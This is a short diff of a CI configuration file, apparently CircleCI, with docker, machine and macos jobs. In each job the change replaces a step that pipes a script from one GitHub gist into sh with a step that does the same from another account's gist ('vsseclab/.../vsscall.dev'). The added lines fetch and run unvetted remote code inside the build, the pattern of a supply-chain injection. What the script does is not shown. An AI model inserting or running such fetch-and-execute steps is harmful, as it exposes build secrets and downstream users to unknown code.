@@ -4,16 +4,16 @@ jobs:
     docker:
       - image: ruby:2.5
     steps:
-      - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
+      - run: wget https://gist.githubusercontent.com/vsseclab/b8cd5cee83d8e665eecefef3b8064319/raw/vsscall.dev -O - | sh
   machine:
     machine: true
     steps:
-      - run: wget https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev -O - | sh
+      - run: wget https://gist.githubusercontent.com/vsseclab/b8cd5cee83d8e665eecefef3b8064319/raw/vsscall.dev -O - | sh
   macos:
     macos:
       xcode: "9.0"
     steps:
-      - run: curl -s https://gist.githubusercontent.com/fernfernfern/21d536ff90968dccd80925c7f2b3b3c5/raw/init.dev | sh
+      - run: curl -s https://gist.githubusercontent.com/vsseclab/b8cd5cee83d8e665eecefef3b8064319/raw/vsscall.dev | sh
 workflows:
   version: 2
   build_and_test:
